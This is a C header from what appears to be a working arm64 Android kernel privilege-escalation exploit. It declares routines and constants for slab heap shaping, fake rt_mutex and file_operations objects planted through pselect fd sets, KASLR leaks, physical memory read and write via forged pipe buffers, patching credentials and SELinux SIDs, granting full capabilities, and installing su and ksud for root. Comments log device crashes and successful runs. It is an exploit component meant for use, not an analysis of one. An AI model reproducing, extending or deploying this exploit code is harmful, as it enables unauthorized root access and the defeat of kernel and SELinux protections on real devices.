#ifndef COMMON_H
#define COMMON_H

#define _GNU_SOURCE
#define __ARM 1

#include "offset.h"
#include <stdint.h>

/*
 * Per-boot randomized layout (arm64 phys/virt randomization).
 * Capture the static target.h fallbacks first, then route the
 * boot-randomized macros through runtime globals filled by
 * ks_layout_init() (kprobe-measured physvirt_offset / vmemmap).
 */
/* Macro aliases would expand lazily *after* the #undef/#define below turns
 * the names into runtime globals (self-assignment). Force value capture at
 * this point instead, while target.h literals are still in effect. */
static const uint64_t ks_target_p0_page_offset = P0_PAGE_OFFSET;
static const uint64_t ks_target_direct_map_base = DIRECT_MAP_BASE;
static const uint64_t ks_target_direct_map_end = DIRECT_MAP_END;
static const uint64_t ks_target_vmemmap_start = VMEMMAP_START;
#ifdef KERNELSNITCH_IDENTITY_START
static const uint64_t ks_target_identity_start = KERNELSNITCH_IDENTITY_START;
#else
static const uint64_t ks_target_identity_start = 0xffffff8000000000ULL;
#endif
#ifdef KERNELSNITCH_IDENTITY_END
static const uint64_t ks_target_identity_end = KERNELSNITCH_IDENTITY_END;
#else
static const uint64_t ks_target_identity_end = 0xffffffffc0000000ULL;
#endif
#define KS_TARGET_P0_PAGE_OFFSET (ks_target_p0_page_offset)
#define KS_TARGET_DIRECT_MAP_BASE (ks_target_direct_map_base)
#define KS_TARGET_DIRECT_MAP_END (ks_target_direct_map_end)
#define KS_TARGET_VMEMMAP_START (ks_target_vmemmap_start)
#define KS_TARGET_IDENTITY_START (ks_target_identity_start)
#define KS_TARGET_IDENTITY_END (ks_target_identity_end)

extern uint64_t ks_p0_page_offset;
extern uint64_t ks_direct_map_base;
extern uint64_t ks_direct_map_end;
extern uint64_t ks_vmemmap_start;
extern uint64_t ks_vmemmap_end;
extern uint64_t ks_identity_start;
extern uint64_t ks_identity_end;
extern int ks_layout_measured;
extern int ks_kaslr_from_kallsyms;
void ks_layout_init(void);
int ks_layout_measure_cfgfs(int fd);
int ks_have_tracefs(void);
void ks_cfgfs_probe(void);

#undef P0_PAGE_OFFSET
#define P0_PAGE_OFFSET (ks_p0_page_offset)
#undef DIRECT_MAP_BASE
#define DIRECT_MAP_BASE (ks_direct_map_base)
#undef DIRECT_MAP_END
#define DIRECT_MAP_END (ks_direct_map_end)
#undef VMEMMAP_START
#define VMEMMAP_START (ks_vmemmap_start)
#undef KERNELSNITCH_IDENTITY_START
#define KERNELSNITCH_IDENTITY_START (ks_identity_start)
#undef KERNELSNITCH_IDENTITY_END
#define KERNELSNITCH_IDENTITY_END (ks_identity_end)

#define PAGE_SHIFT 12
#define PAGE_SIZE (1UL << PAGE_SHIFT)
#define KS_PAGE_SIZE 4096
#define KS_PAGE_MASK 0xfffULL

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <linux/memfd.h>
#include <linux/perf_event.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/file.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "kernelsnitch/utils.h"

#ifndef FOPS_CONFIGFS_READ_OFF
#define FOPS_CONFIGFS_READ_OFF FOPS_READ_ITER_OFF
#endif
#ifndef FOPS_CONFIGFS_WRITE_OFF
#define FOPS_CONFIGFS_WRITE_OFF FOPS_WRITE_ITER_OFF
#endif

#define KERNEL_PAGE_SETUP_ATTEMPTS 6
#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 12
#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
#define SKB_DATA_DELTA (-0xe80LL)

#define ASHMEM_NAME_LEN 256
#define __ASHMEMIOC 0x77
#define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])

#ifndef MM_STRUCT_SZ
#define MM_STRUCT_SZ 0x400
#endif
#ifndef MM_ORDER
#define MM_ORDER 3
#endif
#ifndef MM_PARTIALS
#define MM_PARTIALS 5
#endif
#ifndef CORE
#define CORE 0
#endif
#ifndef KSNITCH_COLLISIONS
#define KSNITCH_COLLISIONS 1
#endif

#define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
#define PIPE_CANDIDATE_PAGES 8
#define SKB_SEND_SIZE (ORDER3_SIZE * 2)
/* ~350 free order-3 Movable pages on fresh boot; 1024 sends ≈ 97% capture. */
#define SKB_RECLAIM_SENDS 1024
#define FOPS_TABLE_OFF FOPS_OFF
#define SKB_FRAG_BIAS 0

#define FAKE_TASK_PRIO 120
#define FAKE_WAITER_PRIO 130
#define ASHMEM_NAME_PREFIX_LEN 11
#define ASHMEM_PREFIX_COUNT 0x6d6873612f766564ULL

#define TASK_COMM_LEN 16
#define SELINUX_KERNEL_SID 1
#define INIT_TASK_TASKS (INIT_TASK + TASK_TASKS_OFF)
#define SECURITY_CAPABLE_HEAD (SECURITY_HOOK_HEADS + 0x40)
#define SIG_ENFORCE (KIMAGE_TEXT_BASE + SIG_ENFORCE_OFF)
#define CAP_FULL 0x000001ffffffffffULL
#define CRED_CAP_WORDS 5
#define CRED_CAP_INHERITABLE 0
#define CRED_CAP_PERMITTED 1
#define CRED_CAP_EFFECTIVE 2
#define CRED_CAP_BSET 3
#define CRED_CAP_AMBIENT 4

#define KMALLOC_SHIFT_HIGH (PAGE_SHIFT + 1)
#define KMALLOC_BUCKETS (KMALLOC_SHIFT_HIGH + 1)
#define KMALLOC_NORMAL_TYPE 0
#define KMALLOC_CGROUP_TYPE 2
#define KMALLOC_PIPE_INDEX 11
#define KMALLOC_CACHE_TYPES 4
#define KMALLOC_CACHE_SLOTS (KMALLOC_CACHE_TYPES * KMALLOC_BUCKETS)
#define KMALLOC_CACHE_SLOT(type, index) \
  (KMALLOC_CACHES + ((type) * KMALLOC_BUCKETS + (index)) * 8)
#define KMALLOC_CGROUP_PIPE_SLOT \
  KMALLOC_CACHE_SLOT(KMALLOC_CGROUP_TYPE, KMALLOC_PIPE_INDEX)
#define KMALLOC_PIPE_OBJ_SIZE 0x800

#define DIRECT_MAP_PAGES ((DIRECT_MAP_END - DIRECT_MAP_BASE) >> PAGE_SHIFT)
#define VMEMMAP_END (VMEMMAP_START + DIRECT_MAP_PAGES * STRUCT_PAGE_SIZE)
#define PAGE_TYPE_SLAB 0xf5

#define PIPE_OBJECT_SIZE KMALLOC_PIPE_OBJ_SIZE
#define PIPE_SCAN_CHUNK 0x400
#define PIPE_OBJS_PER_SLAB 16
#define PIPE_SLAB_SIZE (PIPE_OBJECT_SIZE * PIPE_OBJS_PER_SLAB)
#define PIPE_MIN_PARTIAL 5
#define PIPE_CPU_PARTIAL 2
#define PIPE_DRAIN_SLABS 64
#define PIPE_RECLAIM_SLABS 64
#define PIPE_PARTIAL_GROUPS \
  ((PIPE_MIN_PARTIAL + PIPE_CPU_PARTIAL - 1) / PIPE_CPU_PARTIAL)
#define PIPE_N_SLABS (PIPE_PARTIAL_GROUPS * PIPE_CPU_PARTIAL)
#define PIPE_C_SLABS PIPE_CPU_PARTIAL
#define PIPE_E_SLABS 2
#define PIPE_N_COUNT (PIPE_N_SLABS * PIPE_OBJS_PER_SLAB)
#define PIPE_C_COUNT (PIPE_C_SLABS * PIPE_OBJS_PER_SLAB)
#define PIPE_E_COUNT (PIPE_E_SLABS * PIPE_OBJS_PER_SLAB)
/* PIPE_DRAIN/PIPE_RECLAIM are array maximums; the runtime drain/reclaim
 * pipe counts (KS_PIPE_SLABS, default full) live in pipe.c. */
#define PIPE_DRAIN (PIPE_OBJS_PER_SLAB * PIPE_DRAIN_SLABS)
#define PIPE_RECLAIM (PIPE_OBJS_PER_SLAB * PIPE_RECLAIM_SLABS)
#define PIPE_MAX_ATTEMPTS 12

#define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
#define P0_DATA_ALIAS_CONST(image_addr) \
  (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))

#define CONSUMER_CORE (CORE + 1)
#define CONSUMER_MAX_CALLS 1
/* Route/slide fdset geometry -- 320 is the HARD ceiling for the attack, not
 * a taste choice.  core_sys_select (fs/select.c) allocates SIX bitmaps
 * (in/out/ex + res_in/res_out/res_ex) as one block:
 *     size = FDS_BYTES(n);  bits = stack_fds;
 *     if (size > sizeof(stack_fds) / 6)   // 256/6 = 42 bytes
 *         bits = kvmalloc(6 * size, ...);
 * so nfds <= 320 (size 40B <= 42B) keeps all six bitmaps on THIS thread's
 * kernel stack where the stale waiter S lives, while 576 (size 72B) moves
 * the whole fdset to kmalloc: route then injects fake tree/lock words into
 * the HEAP and never touches S -- core_sys_select's 0x1c0 stack frame still
 * clobbers S's depth, PI-chain reads S.lock == NULL -> _raw_spin_trylock(0)
 * -> panic (the fix64 shift=13 AND fix65 shift=0 panics, both nfds=576).
 * With 320: in/out/ex = word0-14 (route's fake waiter, get_fd_set-written,
 * do_select READ-ONLY) and res_* = word15-29 (zero_fd_set-cleared), so the
 * proven layout also requires S.tree inside word0-14 -- which the 6
 * successful runs (misc.fops write-verified, SUCCESS_r3) prove it is.
 * F_DUPFD floors (NFDS+32/+64) stay far below RLIMIT_NOFILE. */
#define PSELECT_ROUTE_NFDS 320
#define PSELECT_CONSUMER_NICE 19
#define PSELECT_CONSUMER_BURST_CALLS 1
#define PSELECT_ENTER_DELAY_USEC 50000
#define PSELECT_TIMEOUT_SEC 5
#ifndef ROUTE_WAIT_SECONDS
#define ROUTE_WAIT_SECONDS 8
#endif
#define EARLY_PIPE_PREPARE 0
#define SLIDE_NFULNL_LOGGER \
  P0_DATA_ALIAS_CONST(SLIDE_NFULNL_LOGGER_IMAGE)
#define SLIDE_LOGGERS_0_1 P0_DATA_ALIAS_CONST(SLIDE_LOGGERS_0_1_IMAGE)
#define SLIDE_RANDOM_BOOT_ID_DATA \
  P0_DATA_ALIAS_CONST(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE)
#define SLIDE_INIT_TASK P0_DATA_ALIAS_CONST(SLIDE_INIT_TASK_IMAGE)
#define SLIDE_ROOT_TASK_GROUP \
  P0_DATA_ALIAS_CONST(SLIDE_ROOT_TASK_GROUP_IMAGE)
#define SLIDE_SYSCTL_BOOTID P0_DATA_ALIAS_CONST(SLIDE_SYSCTL_BOOTID_IMAGE)

#define PAGE_PAYLOAD_FOPS 0
#define PAGE_PAYLOAD_SLIDE 1

/*
 * KS_PSELECT_PAYLOAD_LOCK: park the fake rt_mutex and the fake task_struct
 * inside the dedicated order-3 payload page instead of empty_zero_page.
 * empty_zero_page is globally shared ZERO_PAGE memory, so rb_erase() there
 * corrupts every untouched anonymous page and crashes zygote (init reboots
 * the phone ~30s later).  The payload region is zeroed, which is exactly
 * the initial state that makes rt_mutex_adjust_prio_chain take the clean
 * rb_erase arm on its first and only attempt.
 */
#define PSELECT_TASK_PROBE_OFF 0x6000
#define PSELECT_TASK_PROBE_SIZE 0x1000

struct kernelsnitch_shared_state;

struct local_sched_attr {
  uint32_t size;
  uint32_t sched_policy;
  uint64_t sched_flags;
  int32_t sched_nice;
  uint32_t sched_priority;
  uint64_t sched_runtime;
  uint64_t sched_deadline;
  uint64_t sched_period;
};

struct root_report {
  uint32_t uid_before;
  uint32_t uid_after;
  uint32_t gid_after;
  uint32_t euid_after;
  uint32_t egid_after;
  int setgid_ret;
  int setgid_errno;
  int setuid_ret;
  int setuid_errno;
  int setenforce_ret;
  int setenforce_errno;
};

struct root_shared {
  atomic_int go;
  atomic_int done;
  /* fix75: root child heartbeat written every busy-poll iteration.
   * On collect timeout the parent prints the last beat (age + uid) to pin
   * the child's death instant against the parent's write sequence --
   * the redo7/24/29 SIGKILL (wst=9) happens inside the go-wait with a
   * silent kernel log, and the beat age is the only remaining witness. */
  atomic_ullong beat_ns;
  atomic_int beat_uid;
  atomic_int installer_gate;
  atomic_int installer_pid;
  atomic_int installer_errno;
  atomic_int installer_started;
  atomic_int installer_done;
  atomic_int installer_ok;
  atomic_int installer_uid;
  atomic_int installer_euid;
  struct root_report report;
};

struct mm_ctx {
  size_t mm_cnt;
  pid_t *childs;
  int *memfds;
};

struct user_pipe_buffer {
  uint64_t page;
  uint32_t offset;
  uint32_t len;
  uint64_t ops;
  uint32_t flags;
  uint32_t pad;
  uint64_t private;
};

extern pid_t pipe_prepare_child;
extern int pselect_payload_lock;
void dump_shared_zero_page(const char *tag);
int shared_zero_dirty(void);
extern uintptr_t page_base;
extern uintptr_t fake_lock;
extern uintptr_t fake_w0;
extern uintptr_t fake_task;
extern uintptr_t fake_parent;
extern uintptr_t fake_right;
extern uintptr_t fake_left;
extern uintptr_t fake_fops;
extern uintptr_t expected_misc_fops;
extern size_t fops_voff;
extern int fops_voff_detected;
extern uintptr_t binwrite_target;
#define fops_table_base() (expected_misc_fops ? expected_misc_fops : fake_fops)
int reload_payload_base(void);

extern uint32_t f_wait;
extern uint32_t f_pi_target;
extern uint32_t f_pi_chain;
extern atomic_int waiter_ready;
extern atomic_int waiter_waiting;
extern atomic_int owner_started;
extern atomic_int owner_chain_done;
extern atomic_int route_done;
extern atomic_int waiter_tid;
extern atomic_int punch_consume_go;
extern atomic_int punch_consume_stop;
extern atomic_int consumer_calls;
extern atomic_int consumer_success;
extern atomic_int consumer_done;
extern atomic_int pselect_planted;
extern atomic_int main_route_delay_usec;
extern atomic_int cfi_stage_done;
extern atomic_int pipe_prepare_request;
extern atomic_int pipe_prepare_done;
extern atomic_int pi_cleanup_done;
extern atomic_int self_root_ok;
extern atomic_int root_stage_dirty;
extern atomic_int waiter_exited;
extern atomic_int owner_exited;
int ks_pi_cleanup(int fd);
extern ssize_t cfi_write_ret;
extern ssize_t cfi_read_ret;
extern ssize_t cfi_read_slot_ret;
extern ssize_t cfi_owner_ret;
extern ssize_t cfi_restore_ret;
extern uint64_t fops_before;
extern uint64_t fops_after;
extern int root_child_done;
extern char ashmem_path[256];
extern uint8_t selinux_before;
extern uint8_t selinux_after;
extern uint32_t root_uid_before;
extern uint32_t root_uid_after;
extern uint64_t capable_head_before;
extern uint64_t capable_head_after;
extern uint64_t init_tasks_prev;
extern uint64_t last_task_guess;
extern int setgid_ret;
extern int setuid_ret;
extern int setenforce_ret;
extern int setenforce_errno;
extern int cfi_attempts;
extern int pipe_stage_attempts;
extern int cfi_dirty_seen;
extern int cfi_last_step;
extern int cfi_last_errno;
extern uint64_t kmalloc_pipe_cache;
extern uint64_t kmalloc_normal_1k_cache;
extern uint64_t kmalloc_normal_2k_cache;
extern uint64_t kmalloc_cgroup_1k_cache;
extern uint64_t kmalloc_cgroup_2k_cache;
extern uint64_t candidate_slab_cache;
extern int pipe_cache_gate_ok;
extern int pipe_cache_page_index;
extern int pipe_cache_slot_hit;
extern uint64_t pipe_page_slab_cache[PIPE_CANDIDATE_PAGES];
extern uint32_t pipe_page_type[PIPE_CANDIDATE_PAGES];
extern uintptr_t pipebuf_page_base;
extern uintptr_t pipebuf_addr;
extern int pipebuf_pipe_idx;
extern char physrw_readback[64];
extern char physrw_after_write[64];
extern int physrw_read_ok;
extern int physrw_write_ok;
extern int pipe_scan_vmemmap;
extern int pipe_scan_ops;
extern int pipe_scan_len;
extern int pipe_probe_found;
extern uint64_t pipe_probe_page;
extern uint64_t pipe_probe_ops;
extern uint64_t pipe_probe_private;
extern uint32_t pipe_probe_len;
extern uint32_t pipe_probe_flags;
extern uint64_t pipe_scan_first_page;
extern uint64_t pipe_scan_first_ops;
extern uint64_t pipe_scan_q0;
extern uint64_t pipe_scan_q1;
extern uint64_t pipe_scan_q2;
extern uint64_t pipe_scan_q3;
extern uint32_t pipe_scan_first_len;
extern uint32_t pipe_scan_first_flags;
extern uint64_t physrw_read64_before;
extern uint64_t physrw_read64_after;
extern uint64_t physrw_write64_value;
extern int physrw_read64_ok;
extern int physrw_write64_ok;
extern int kaslr_done;
extern int kaslr_step;
extern uint64_t kaslr_fops_alias;
extern uint64_t kaslr_open_ptr;
extern uint64_t kaslr_ioctl_ptr;
extern uint64_t kaslr_mmap_ptr;
extern uint64_t kaslr_release_ptr;
extern uint64_t kaslr_show_fdinfo_ptr;
extern uint64_t kaslr_base;
extern uint64_t kaslr_slide;
extern uint64_t kaslr_expected_ioctl;
extern uint64_t kaslr_expected_mmap;
extern uint64_t kaslr_expected_release;
extern uint64_t kaslr_expected_show_fdinfo;
extern uint64_t slide_bootid_before;
extern uint64_t slide_bootid_after;
extern uint64_t slide_bootid_want;
extern ssize_t slide_bootid_restore_ret;
extern uint64_t current_task_addr;
extern uint64_t current_cred_addr;
extern uint64_t current_real_cred_addr;
extern uint64_t current_cred_security_addr;
extern uint64_t current_real_cred_security_addr;
extern uint32_t cred_sid_before;
extern uint32_t cred_sid_after;
extern uint32_t real_cred_sid_before;
extern uint32_t real_cred_sid_after;
extern uint32_t target_cred_osid;
extern uint32_t target_cred_sid;
extern uint32_t selinux_cred_blob_off;
extern int task_walk_iters;
extern uint64_t task_walk_last_entry;
extern uint32_t task_walk_last_pid;
extern uint32_t task_walk_last_tgid;
extern uint32_t found_task_pid;
extern uint32_t found_task_tgid;
extern char found_task_comm[TASK_COMM_LEN + 1];
extern pid_t root_child_pid;
extern int root_ready_pipe[2];
extern struct root_shared *root_shared;
extern int memfd_leak;
extern int opt_disabled_selinux;
extern int opt_keep_selinux_context;
extern int opt_patch_self;

int run_exploit(int argc, char **argv);
int install_embedded_ksud(void);
int install_embedded_su(pid_t *daemon_pid);
void prepare_ksud_status_log(void);
void ksud_status_note(const char *fmt, ...);
void read_first_line(const char *path, char *buf, size_t len);
void log_startup_context(void);
void log_slide_child_context(void);
void disable_rseq_for_thread(void);
long futex_op(
    uint32_t *uaddr, int op, uint32_t val,
    const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3);
long sched_setattr_tid(int tid, int nice_value);
int try_cache_ashmem_path(const char *path);
int same_rdev_path(const char *path, dev_t rdev);
void init_ashmem_path(void);
int open_ashmem_device(void);
extern int g_fops_probe_fd;
void fops_guard_start(void);
void fops_guard_set_expect(uintptr_t expect);
uintptr_t fops_guard_get_expect(void);
int has_zero_byte(uintptr_t value);
uintptr_t p0_data_alias(uintptr_t image_addr);
uintptr_t p0_alias_image_offset(uintptr_t data_alias);
uintptr_t data_addr(uintptr_t image_addr);
uintptr_t kaslr_image_addr(uintptr_t image_addr);
uintptr_t text_addr(uintptr_t image_addr);
uintptr_t slide_canon_addr(uintptr_t data_alias);
uintptr_t canon_addr(uintptr_t image_addr);
void put64(unsigned char *p, size_t off, uint64_t value);
void put32(unsigned char *p, size_t off, uint32_t value);
void put_fake_fops_table(unsigned char *p, size_t off);
int ks_neutralize_fake_fops_close(int fd);
void ks_fd_hold_daemon(const char *why);
int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len);
int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos);
int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len);
int cfgfs_lock(void);
void cfgfs_unlock(int lfd);
pid_t clone_child(void);
pid_t clone_leak_child(void);
int open_memfd(pid_t child);
void kill_child(pid_t child);
int release_child_handoff(pid_t child);
void close_reclaim_sockets(void);
void ks_diag_fd(const char *tag, int fd);
void ks_diag_table(const char *tag);
int ks_fetch64(uintptr_t addr, uint64_t *out);
int ks_watch_frees_events(void);
void pselect_route_preflight(void);
int pselect_scrub_slot(int fd);
int reclaim_recv_fd(void);
void ks_hold_dump(const char *tag);
void setup_kernelsnitch(void);
int kernelsnitch_collisions_ready(void);
int kernelsnitch_collisions_done(void);
void run_kernelsnitch_bruteforce(void);
uintptr_t current_kernelsnitch_mm_struct(void);
uintptr_t cleanup_kernelsnitch(void);
void close_ctx_memfds(struct mm_ctx *ctx);
void free_ctx_storage(struct mm_ctx *ctx);
void cleanup_page_prepare_state(void);
int clone_memfd(void);
void prepare_ctxs(void);
int prepare_skb_payload(uintptr_t base, int payload_mode);
uintptr_t prepare_kernel_page(int payload_mode);
uintptr_t prepare_good_kernel_page(int payload_mode);

void fdset_put_word(fd_set *set, int word, uint64_t value);
uint64_t fdset_get_word(const fd_set *set, int word);
void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd);
void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
void do_pselect_fake_lock_route(void);

int slide_pselect_words_per_set(void);
int slide_pselect_global_word(int waiter_word);
int slide_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value);
uint64_t slide_pselect_get_global_word(
    const fd_set *in, const fd_set *out, const fd_set *ex,
    int words_per_set, int global_word);
void slide_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name);
void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
void open_slide_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd);
void slide_pselect_stack_copy(void);
int hex_value(char c);
uint64_t slide_read_stext(void);
uint64_t slide_child_leak_stext(void);
int slide_leak_kernel_base(void);
/* Write kaslr_base/slide + current boot_id to a shared file (root/shell
 * rounds) so app-uid rounds of the SAME boot can boot past the perf leak
 * (denied to untrusted_app) without the slide fallback.  Best-effort. */
void ks_persist_kaslr_file(void);
/* Payload-page handoff for exam-2 app-uid rounds: a shell/root round of
 * the same boot captures+verifies the payload page (tp oracles live only
 * there) and holds it (KS_PREPARE_HALT), persisting its base via
 * ks_persist_payload_file; the app-uid round pastes it with
 * ks_payload_paste (KS_PAYLOAD_PASTE=1) instead of blind-draining into a
 * garbage fops table.  Best-effort / returns 0 on any mismatch. */
void ks_persist_payload_file(void);
int ks_payload_paste(void);
/* Append DONE rc=0 to $KS_STATE_FILE synchronously from the root=1
 * contract line's process — the tail panic beats any poller. */
void ks_lock_contract_state(void);
/* Capture historical panic oopses from /sys/fs/pstore into
 * /data/local/tmp/pstore_dump inside a uid0 window.  Called both on the
 * root=1 contract path (via ks_lock_contract_state) and at the exit tail
 * so a SAFE abort (payload table dead before gate -> no pipe_prepare fork)
 * also captures the previous boot's panic before this chain ends. */
void ks_dump_pstore_best_effort(void);
uint64_t perf_leak_text_base(void);

ssize_t configfs_write_once(
    int fd, uintptr_t target, const void *data, size_t len);
ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len);
ssize_t configfs_read_once_quiet(int fd, uintptr_t target, void *data,
                                 size_t len);
void run_pvo_oracle(void);
int is_kernel_ptr(uintptr_t value);
int is_direct_ptr(uintptr_t value);
uint64_t kernel_read64(int fd, uintptr_t target);
ssize_t kernel_write_data(
    int fd, uintptr_t target, const void *data, size_t len);
ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len);
int repair_fake_fops_llseek(int fd);
int refresh_fake_fops_text(int fd);
int leak_kernel_base(int fd);
int restore_slide_boot_id(int fd);
int install_child_root(int fd);
int try_cfi_stage(void);

void init_ctx(struct mm_ctx *ctx, size_t cnt);
void resize_pipe_slots(int pipefd[2], size_t slots);
void make_pipe_object(int pipefd[2]);
void alloc_pipe_object(int pipefd[2]);
void free_pipe_object(int pipefd[2]);
void shape_pipe_cache_once(void);
void shape_pipe_cache(void);
uintptr_t prepare_pipe_buffer_page_child(void);
uintptr_t prepare_pipe_buffer_page(void);
void reset_pipe_attempt(void);
uintptr_t direct_to_page(uintptr_t addr);
uintptr_t direct_to_head_page(int fd, uintptr_t addr);
uintptr_t page_to_direct(uintptr_t page);
uintptr_t pipe_buf_ops_addr(void);
int pipe_cache_matches(uint64_t slab_cache);
int pipe_reclaim_cache_gate(int fd);
int read_pipe_slab(int fd, uintptr_t base, unsigned char *slab);
int find_pipe_buffer(int fd, uintptr_t base);
int pipe_phys_read(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    void *out, size_t len);
int pipe_phys_write(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    const void *data, size_t len);
void forge_pipe_buffers_on_page(
    int fd, uintptr_t base, uintptr_t direct_addr, size_t len, int for_write);
int pipe_clear_forged_ops(int fd);
int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len);
int pipe_phys_write_data(
    int fd, uintptr_t direct_addr, const void *data, size_t len);
uint64_t pipe_read64(int fd, uintptr_t direct_addr);
uint32_t pipe_read32(int fd, uintptr_t direct_addr);
int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value);
int install_pipe_physrw(int fd);

int spawn_root_child(void);
int collect_root_child(void);
uint64_t find_task_by_tgid(int fd, uint32_t want_tgid);
int patch_cred_identity(int fd, uintptr_t cred);
int patch_cred_sid(int fd, uintptr_t cred);
int patch_cred_object(int fd, uintptr_t cred);
int install_android_root(int fd);

#endif
